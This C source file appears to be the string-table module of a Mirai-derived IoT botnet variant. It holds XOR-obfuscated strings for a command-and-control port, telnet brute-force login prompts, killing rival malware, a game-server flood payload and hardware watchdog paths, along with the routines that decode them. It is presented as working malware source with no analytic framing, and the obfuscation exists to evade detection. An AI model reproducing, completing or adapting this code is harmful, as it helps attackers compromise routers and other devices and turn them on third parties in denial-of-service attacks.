#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_key = 0xdeadbeef;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
    add_entry(TABLE_CNC_PORT, "\x2C\xE0", 2); // 3778
    add_entry(TABLE_SCAN_CB_PORT, "\x07\x71", 2); // 9555
    add_entry(TABLE_EXEC_SUCCESS, "\x4E\x58\x50\x46\x02\x41\x4D\x41\x49\x02\x44\x47\x51\x56\x22", 29);

    // killer
    add_entry(TABLE_KILLER_PROC, "\x0D\x52\x50\x4D\x41\x0D\x22", 7);
    add_entry(TABLE_KILLER_EXE, "\x0D\x47\x5A\x47\x22", 5);
    add_entry(TABLE_KILLER_FD, "\x0D\x44\x46\x22", 4);
    add_entry(TABLE_KILLER_MAPS, "\x0D\x4F\x43\x52\x51\x22", 6);
    add_entry(TABLE_KILLER_STATUS, "\x0D\x51\x56\x43\x56\x57\x51\x22", 8);
    add_entry(TABLE_KILLER_TCP, "\x0D\x52\x50\x4D\x41\x0D\x4C\x47\x56\x0D\x56\x41\x52\x22", 14);
    add_entry(TABLE_KILLER_CMDLINE, "\x0D\x41\x4F\x46\x4E\x4B\x4C\x47\x22", 9);
    
    add_entry(TABLE_KILLER_TMP, "\x56\x4F\x52\x0D\x22", 5);
    add_entry(TABLE_KILLER_DATALOCAL, "\x46\x43\x56\x43\x0D\x4E\x4D\x41\x43\x4E\x22", 11);
    add_entry(TABLE_KILLER_QTX, "\x53\x56\x5A\x40\x4D\x56\x22", 7);
    add_entry(TABLE_KILLER_DOT, "\x0C\x22", 2);
    add_entry(TABLE_KILLER_ARC, "\x43\x50\x41\x22", 4);
    add_entry(TABLE_KILLER_ARM, "\x43\x50\x4F\x22", 4);
    add_entry(TABLE_KILLER_ARM5, "\x43\x50\x4F\x17\x22", 5);
    add_entry(TABLE_KILLER_ARM6, "\x43\x50\x4F\x14\x22", 5);
    add_entry(TABLE_KILLER_ARM7, "\x43\x50\x4F\x15\x22", 5);
    add_entry(TABLE_KILLER_X86, "\x5A\x1A\x14\x22", 4);
    add_entry(TABLE_KILLER_X86_64, "\x5A\x1A\x14\x7D\x14\x16\x22", 7);
    add_entry(TABLE_KILLER_SH4, "\x51\x4A\x16\x22", 4);
    add_entry(TABLE_KILLER_MIPS, "\x4F\x4B\x52\x51\x22", 5);
    add_entry(TABLE_KILLER_MPSL, "\x4F\x52\x51\x4E\x22", 5);
    add_entry(TABLE_KILLER_PPC, "\x52\x52\x41\x22", 4);
    add_entry(TABLE_KILLER_SDA, "\x51\x46\x43\x22", 4);
    add_entry(TABLE_KILLER_MTD, "\x4F\x56\x46\x22", 4);
    add_entry(TABLE_KILLER_QTX2, "\x40\x4D\x56\x7F\x28", 5);
    add_entry(TABLE_KILLER_HAKAI, "\x4A\x43\x49\x43\x4B\x22", 6);

    // scan
    add_entry(TABLE_SCAN_SHELL, "\x51\x4A\x47\x4E\x4E\x22", 6);
    add_entry(TABLE_SCAN_ENABLE, "\x47\x4C\x43\x40\x4E\x47\x22", 7);
    add_entry(TABLE_SCAN_SYSTEM, "\x51\x5B\x51\x56\x47\x4F\x22", 7);
    add_entry(TABLE_SCAN_SH, "\x51\x4A\x22", 3);
    add_entry(TABLE_SCAN_LSHELL, "\x4E\x4B\x4C\x57\x5A\x51\x4A\x47\x4E\x4E\x22", 11);
    add_entry(TABLE_SCAN_QUERY, "\x0D\x40\x4B\x4C\x0D\x40\x57\x51\x5B\x40\x4D\x5A\x02\x6E\x78\x70\x66\x22", 18); 
    add_entry(TABLE_SCAN_RESP, "\x6E\x78\x70\x66\x18\x02\x43\x52\x52\x4E\x47\x56\x02\x4C\x4D\x56\x02\x44\x4D\x57\x4C\x46\x22", 23);
    add_entry(TABLE_SCAN_NCORRECT, "\x4C\x41\x4D\x50\x50\x47\x41\x56\x22", 9);
    add_entry(TABLE_SCAN_OGIN, "\x4D\x45\x4B\x4C\x22", 5);
    add_entry(TABLE_SCAN_ASSWORD, "\x43\x51\x51\x55\x4D\x50\x46\x22", 8);
    add_entry(TABLE_SCAN_ENTER, "\x47\x4C\x56\x47\x50\x22", 6);
    add_entry(TABLE_SCAN_BAH, "\x40\x43\x4A\x22", 4);
    add_entry(TABLE_SCAN_START, "\x51\x56\x43\x50\x56\x22", 6);

    // atk
    add_entry(TABLE_ATK_VSE, "\x76\x71\x4D\x57\x50\x41\x47\x02\x67\x4C\x45\x4B\x4C\x47\x02\x73\x57\x47\x50\x5B\x22", 21);
    add_entry(TABLE_ATK_RESOLVER, "\x0D\x47\x56\x41\x0D\x50\x47\x51\x4D\x4E\x54\x0C\x41\x4D\x4C\x44\x22", 17);
    add_entry(TABLE_ATK_NSERV, "\x4C\x43\x4F\x47\x51\x47\x50\x54\x47\x50\x02\x22", 12);
	
    // watchdog
	add_entry(TABLE_MISC_WATCHDOG, "\x0D\x46\x47\x54\x0D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 14);
	add_entry(TABLE_MISC_WATCHDOG2, "\x0D\x46\x47\x54\x0D\x4F\x4B\x51\x41\x0D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 19);
    add_entry(TABLE_MISC_WATCHDOG3, "\x0D\x51\x40\x4B\x4C\x0D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 15);
    add_entry(TABLE_MISC_WATCHDOG4, "\x0D\x40\x4B\x4C\x0D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 14);
    add_entry(TABLE_MISC_WATCHDOG5, "\x0D\x46\x47\x54\x0D\x64\x76\x75\x66\x76\x13\x12\x13\x7D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 23);
    add_entry(TABLE_MISC_WATCHDOG6, "\x0D\x46\x47\x54\x0D\x64\x76\x75\x66\x76\x13\x12\x13\x0D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 23);
    add_entry(TABLE_MISC_WATCHDOG7, "\x0D\x46\x47\x54\x0D\x55\x43\x56\x41\x4A\x46\x4D\x45\x12\x22", 15);
    add_entry(TABLE_MISC_WATCHDOG8, "\x0D\x47\x56\x41\x0D\x46\x47\x44\x43\x57\x4E\x56\x0D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 22);
    add_entry(TABLE_MISC_WATCHDOG9, "\x0D\x47\x56\x41\x0D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 14);
	
    // rand number
	add_entry(TABLE_MISC_RAND, "\x46\x49\x43\x4D\x55\x48\x44\x4B\x50\x4A\x4B\x43\x46\x13\x48\x11\x47\x46\x48\x49\x43\x4B\x22", 23);
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[table] Tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
